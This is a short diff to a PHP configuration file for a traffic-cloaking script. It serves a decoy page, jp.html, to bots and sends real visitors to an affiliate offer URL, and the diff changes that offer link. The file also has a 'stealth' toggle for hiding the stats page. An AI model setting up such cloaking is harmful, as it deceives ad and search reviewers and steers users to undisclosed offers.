@@ -1,7 +1,7 @@
 <?php
 /* Required settings     */
 $CLOAKING['WHITE_PAGE'] = 'jp.html';//PHP/HTML file or URL used for bots
-$CLOAKING['OFFER_PAGE'] = 'https://trafficx.g2afse.com/HzSSC1';//PHP/HTML file or URL offer used for real users
+$CLOAKING['OFFER_PAGE'] = 'https://trafficx.g2afse.com/click?pid=56&offer_id=8&sub1=jp-art1&l=1632234968';//PHP/HTML file or URL offer used for real users
 $CLOAKING['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 $CLOAKING['STEALTH'] = 'off';// replace "on" with "off" to hide stat page
 /*********************************************/
